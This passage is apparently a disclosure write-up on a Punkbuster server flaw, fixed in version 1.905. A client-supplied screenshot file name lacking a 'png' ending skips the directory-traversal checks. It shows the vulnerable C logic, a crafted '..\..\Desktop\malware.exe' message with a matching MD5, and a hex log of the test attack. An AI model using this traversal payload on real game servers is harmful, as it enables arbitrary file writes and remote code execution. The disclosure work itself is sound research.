commands:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="e7e7" class="po mh gu pd b ij pp pq l pr ps">pb_sv_SsWidth 320 //Requested pixel width of remote screenshots<br/>pb_sv_SsHeight 240 //Requested pixel height of remote screenshots<br/>pb_sv_SsXpct 50 //Percentage across screen for remote screenshots<br/>pb_sv_SsYpct 50 //Percentage down screen for remote screenshots<br/>pb_sv_SsSrate 1 //Sample Rate for remote screenshots<br/>pb_sv_SsDelay 0 //Maximum delay client waits before capturing screenshot</span></pre><p id="adae" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">Back to the log. After the server sends the client the screenshot request the client answers with the following message after capturing the screenshot:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="d5c7" class="po mh gu pd b ij pp pq l pr ps">G144380 C1D6699AE4B1EB4178C5E6F5EAB80F59 Apb000001.png</span></pre><p id="456f" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">This format is much simpler:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="2639" class="po mh gu pd b ij pp pq l pr ps">G[size] [md5] [letter][pb%06.png]</span><span id="d2a6" class="po mh gu pd b ij pt pq l pr ps">[size] = The size of the screenshot, in bytes<br/>[md5] = MD5 hash of the screenshot data<br/>[letter] = Screenshot counter, A for 1st, B for 2nd etc<br/>[pb%06.png] = Screenshot name, [file_id] is taken from the server request</span></pre><p id="8170" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">After this header you can see the client begin transferring the screenshot data, note the <code class="cx pa pb pc pd b">PNG</code> magic string on the last message from the client.</p><h1 id="51d9" class="mg mh gu bf mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bk">The Problem</h1><p id="51c5" class="pw-post-body-paragraph ns nt gu nu b nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op gn bk">Some of you may have already noticed the possible problem here. The server tells the client the <code class="cx pa pb pc pd b">file_id</code> for the screenshot but then <strong class="nu gv">the client</strong> actually tells the server the screenshot name! This is, of-course, not a problem on its own, because the server can still handle malicious file names on its side.</p><p id="7735" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">But in this case — it didn’t.</p><p id="1db5" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">Consider the following code which is a simplified version of the server’s code:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="0252" class="po mh gu pd b ij pp pq l pr ps">char ssPath[0x100];<br/>// clientMsg = &quot;104553 8E4B1C2F39151F72E364E461FB43F931 Apb000001.png&quot;;<br/>int ssSize = stoi(GetParamBySpace(clientMsg, 0));<br/>char *ssHash = GetParamBySpace(clientMsg, 1);<br/>// Add 1 to remove the ss counter, A in this case<br/>char *ssFileName = GetParamBySpace(clientMsg, 2) + 1; <br/>if (!strnicmp(&amp;ssFileName[strlen(ssFileName) - 3], &quot;png&quot;, 3)) {<br/> // ssFileName indeed ends with png<br/> // Do some checks against trivial directory traversal attacks<br/> // like search for &quot;//&quot; and &quot;..&quot; and then cat <br/> // the filename to \\svss\\ in the pb folder<br/> // eventually do something like:<br/> sprintf(ssPath, &quot;%s\\svss\\%s&quot;, pbMasterFolderPath, ssFileName);<br/>} else { // &lt;- Problem is here<br/> // No checks for directory traversal attacks in this branch<br/> sprintf(ssPath, &quot;%s\\svss\\%s&quot;, pbMasterFolderPath, ssFileName);<br/>}<br/>…<br/>…<br/>…<br/>ssFileData = malloc(ssSize);</span></pre><h1 id="45f8" class="mg mh gu bf mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bk">Exploiting the Bug</h1><p id="335b" class="pw-post-body-paragraph ns nt gu nu b nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op gn bk">At this point it is pretty obvious what one needs to do in order to exploit this bug. An attacker can simply modify the file name so it won’t end with a png, passing all the directory traversal mitigations Punkbuster implemented, basically gaining the ability to write any file to anywhere in the server’s filesystem.</p><p id="5ca1" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">We crafted the following screenshot message:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="70f2" class="po mh gu pd b ij pp pq l pr ps">G22 86FCCBBB45E7AB6CFB84B295B4F29360 ..\..\..\..\..\Desktop\malware.exe</span></pre><p id="cdd8" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">With the following file’s data:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="f6d1" class="po mh gu pd b ij pp pq l pr ps">MZ___EVIL_MALWARE_DATA</span></pre><p id="470c" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">Note that we had to provide a correct MD5 for that data or otherwise the server will just drop the message.</p><p id="4168" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">The following log represents the server side when we tested such an attack:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="7766" class="po mh gu pd b ij pp pq l pr ps">Msg FROM slot #-1<br/>00000000 | 70 62 5f 73 76 5f 67 65 | pb_sv_ge<br/>00000008 | 74 73 73 20 31          | tss 1</span><span id="f498" class="po mh gu pd b ij pt pq l pr ps">Msg TO   slot #0<br/>00000000 | 49 30 20 38 30 31 31 31 | I0 80111<br/>00000008 | 33 31 32 36 20 32 20 33 | 3126 2 3<br/>00000010 | 32 30 20 32 34 30 20 35 | 20 240 5<br/>00000018 | 30 20 35 30 20 31 00    | 0 50 1.</span><span id="f00b" class="po mh gu pd b ij pt pq l pr ps">Msg FROM slot #0<br/>00000000 | 47 32 32 20 38 36 46 43 | G22 86FC<br/>00000008 | 43 42 42 42 34 35 45 37 | CBBB45E7<br/>00000010 | 41 42 36 43 46 42 38 34 | AB6CFB84<br/>00000018 | 42 32 39 35 42 34 46 32 | B295B4F2<br/>00000020 | 39 33 36 30 20 2e 2e 5c | 9360 ..\<br/>00000028 | 2e 2e 5c 2e 2e 5c 2e 2e | ..\..\..<br/>00000030 | 5c 2e 2e 5c 44 65 73 6b | \..\Desk<br/>00000038 | 74 6f 70 5c 6d 61 6c 77 | top\malw<br/>00000040 | 61 72 65 2e 65 78 65 00 | are.exe.</span><span id="5ee3" class="po mh gu pd b ij pt pq l pr ps">Msg FROM slot #0<br/>00000000 | 48 00 00 2e 4d 5a 5f 5f | H...MZ__<br/>00000008 | 5f 45 56 49 4c 5f 4d 41 | _EVIL_MA<br/>00000010 | 4c 57 41 52 45 5f 44 41 | LWARE_DA<br/>00000018 | 54 41                   | TA</span></pre><p id="984b" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">And indeed, <code class="cx pa pb pc pd b">malware.exe</code> was written to the Desktop, far far away from the Punkbuster folder:</p><figure class="nh ni nj nk nl nm ne nf paragraph-image"><div role="button" tabindex="0" class="nn no fj np bh nq"><div class="ne nf pu"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*Yl7DLaCFVsViu8gV 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*Yl7DLaCFVsViu8gV 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*Yl7DLaCFVsViu8gV 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*Yl7DLaCFVsViu8gV 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*Yl7DLaCFVsViu8gV 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*Yl7DLaCFVsViu8gV 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Yl7DLaCFVsViu8gV 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*Yl7DLaCFVsViu8gV 640w, https://miro.medium.com/v2/resize:fit:720/0*Yl7DLaCFVsViu8gV 720w, https://miro.medium.com/v2/resize:fit:750/0*Yl7DLaCFVsViu8gV 750w, https://miro.medium.com/v2/resize:fit:786/0*Yl7DLaCFVsViu8gV 786w, https://miro.medium.com/v2/resize:fit:828/0*Yl7DLaCFVsViu8gV 828w, https://miro.medium.com/v2/resize:fit:1100/0*Yl7DLaCFVsViu8gV 1100w, https://miro.medium.com/v2/resize:fit:1400/0*Yl7DLaCFVsViu8gV 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln nr c" width="700" height="135" loading="lazy" role="presentation"/></picture></div></div><figcaption class="pv ff pw ne nf px py bf b bg z du">procmon showing malware.exe was written to the user’s Desktop</figcaption></figure><p id="8641" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">As an attacker you don’t actually need to wait for the server to ask for a screenshot and can just send the relevant data as it was requested and it will still be received on the server. Mind that exploiting this vulnerability might not be that easy, as the client side, which is the part needed to actually achieve that, is heavily obfuscated.</p><h1 id="7ff1" class="mg mh gu bf mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bk">Applications</h1><p id="7ab8" class="pw-post-body-paragraph ns nt gu nu b nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op gn bk">The ability to write any file anywhere is practically a remote code execution because an attacker can obviously just overwrite modules that get loaded frequently which will load the attacker’s code.</p><p id="a585" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">Punkbuster might be old but there are many servers using its service to this day. It is important to remember that these servers are not cheap. Those are gaming servers with expensive hardware that can be a jackpot for hackers to install miners on.</p><p id="6075" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">Sensitive information might be on those servers because usually only the hosting company staff have access to them.</p><p id="046f" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">This can also lead to a bigger attack from inside the network.</p><h1 id="626c" class="mg mh gu bf mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bk">Even Balance Response</h1><p id="3db7" class="pw-post-body-paragraph ns nt gu nu b nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op gn bk">Tony from Even Balance was quick to respond. He thanked us and assured Even Balance will address this vulnerability right away.</p><p id="7664" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">A few days ago a new patch (<code class="cx pa pb pc pd b">1.905</code>) was released that supposedly addresses this issue. All servers that are running Punkbuster will automatically download the new version.</p><p id="7367" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">We offered our help with addressing this issue and asked that the fixing process will be collaborated with us but Even Balance chose not to do that (which is completely fine, of-course), so we can’t be responsible that the fix actually addresses the issue well.</p><p id="225d" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">With that being said, we <strong class="nu gv">did</strong> test our old exploit against the new version and it didn’t work. We didn’t actually reverse and BinDiffed the new patch, so we can’t be <strong class="nu gv">absolutely</strong> sure it isn’t exploitable anymore, but from a superficial examination it seems that the issue has been fixed.</p><p id="a8d2" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">Even Balance also posted the following message on their website:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="8490" class="po mh gu pd b ij pp pq l pr ps">A serious security (remote code execution) flaw involving PunkBuster was recently discovered and reported. An attacker with knowledge of the flaw can exploit it by replacing any unprotected (non-read-only) executable file with the attacker&#x27;s provided file, even outside the &quot;pb&quot; subdirectory, thus compromising the game server&#x27;s host environment. This flaw does not affect player installations nor the PunkBuster client. New PB Server version v1.905 which addresses the flaw has been released for all supported games via our auto-update system and for use by the PBSETUP stand-alone tool. Server administrators running a PB Server version prior to version 1.905 for any game should disable PunkBuster on their game server(s). Thanks to Daniel Prizmant at Palo Alto Networks for discovering the flaw and reporting it to us in a professional manner.</span></pre></div></div></div></div></section></div></div></article></div><div class="l"></div><footer class="pz qa qb qc qd ab q qe qf c"><div class="l ae"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab cp qg"><div class="ab q ke"><div class="qh l"><span class="l qi qj qk e d"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fe22e6cf2f36e&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40prizmant%2Fhacking-punkbuster-e22e6cf2f36e&amp;user=Daniel+Prizmant&amp;userId=6accd23011ad&amp;source=---footer_actions--e22e6cf2f36e---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></span><span class="l h g f ql qm"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fe22e6cf2f36e&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40prizmant%2Fhacking-punkbuster-e22e6cf2f36e&amp;user=Daniel+Prizmant&amp;userId=6accd23011ad&amp;source=---footer_actions--e22e6cf2f36e---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ao kk la lb ab q fk lc ld" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="le"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ab q"><div class="qn l is"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fe22e6cf2f36e&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40prizmant%2Fhacking-punkbuster-e22e6cf2f36e&amp;source=---footer_actions--e22e6cf2f36e---------------------bookmark_footer-----------"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lg" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="qn l is"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fk ah ai aj ak al lo an ao ap ex lp lq ld lr"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="qo l"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab qp qq qr iu it"><div class="qs qt qu qv qw qx qy qz ra rb ab cp"><div class="h k"><a tabindex="0" rel="noopener follow" href="/@prizmant?source=post_page---post_author_info--e22e6cf2f36e--------------------------------"><div class="l fj"><img alt="Daniel Prizmant" class="l fd by ic ib cx" src="https://miro.medium.com/v2/resize:fill:96:96/0*A_LwwCYAwlc0mu4V.jpg" width="48" height="48" loading="lazy"/><div class="fr by l ic ib fs n ay rc"></div></div></a></div><div class="j i d"><a tabindex="0" rel="noopener follow" href="/@prizmant?source=post_page---post_author_info--e22e6cf2f36e--------------------------------"><div class="l fj"><img alt="Daniel Prizmant" class="l fd by rd re cx" src="https://miro.medium.com/v2/resize:fill:128:128/0*A_LwwCYAwlc0mu4V.jpg" width="64" height="64" loading="lazy"/><div class="fr by l rd re fs n ay rc"></div></div></a></div><div class="j i d rf is"><div class="ab"><span><button class="bf b bg z rg rh ri rj rk rl rm ev ew rn ro rp fa fb fc fd bm fe ff">Follow</button></span></div></div></div><div class="ab co rq"><div class="rr rs rt ru rv l"><a class="af ag ah aj ak al am an ao ap aq ar as at ab q" rel="noopener follow" href="/@prizmant?source=post_page---post_author_info--e22e6cf2f36e--------------------------------"><h2 class="pw-author-name bf rx ry rz sa sb sc sd od se sf oh sg sh ol si sj bk"><span class="gn rw">Written by <!-- -->Daniel Prizmant</span></h2></a><div class="sk ab ia"><div class="l is"><span class="pw-follower-count bf b bg z du"><a class="af ag ah ai aj ak al am an ao ap aq ar il" rel="noopener follow" href="/@prizmant/followers?source=post_page---post_author_info--e22e6cf2f36e--------------------------------">4 Followers</a></span></div><div class="bf b bg z du ab pr"><span class="im l" aria-hidden="true"><span class="bf b bg z du">·</span></span><a class="af ag ah ai aj ak al am an ao ap aq ar il" rel="noopener follow" href="/@prizmant/following?source=post_page---post_author_info--e22e6cf2f36e--------------------------------">1 Following</a></div></div><div class="sl l"></div></div></div><div class="h k"><div class="ab"><span><button class="bf b bg z rg rh ri rj rk rl rm ev ew rn ro rp fa fb fc fd bm fe ff">Follow</button></span></div></div></div></div></div></div><div class="sm l"><div class="sn bh r qo"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab q cp"><h2 class="bf rx mj ml mm mn mp mq mr mt mu mv mx my mz nb nc bk">No responses yet</h2><div class="ab so"><div><div class="bm" aria-hidden="false"><a class="sp sq" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--e22e6cf2f36e--------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div><div class="sr ss st su sv l"></div></div></div></div><div class="sw sx sy sz ta l bx"><div class="h k j"><div class="sn bh tb tc"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="td ab ke iv"><div class="te tf l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----e22e6cf2f36e--------------------------------" rel="noopener follow"><p class="bf b dv z du">Help</p></a></div><div class="te tf l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----e22e6cf2f36e--------------------------------" rel="noopener follow"><p class="bf b dv z du">Status</p></a></div><div class="te tf l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/about?autoplay=1&amp;source=post_page-----e22e6cf2f36e--------------------------------"><p class="bf b dv z du">About</p></a></div><div class="te tf l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----e22e6cf2f36e--------------------------------"><p class="bf b dv z du">Careers</p></a></div><div class="te tf l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="pressinquiries@medium.com?source=post_page-----e22e6cf2f36e--------------------------------" rel="noopener follow"><p class="bf b dv z du">Press</p></a></div><div class="te tf l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----e22e6cf2f36e--------------------------------" rel="noopener follow"><p class="bf b dv z du">Blog</p></a></div><div class="te tf l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" 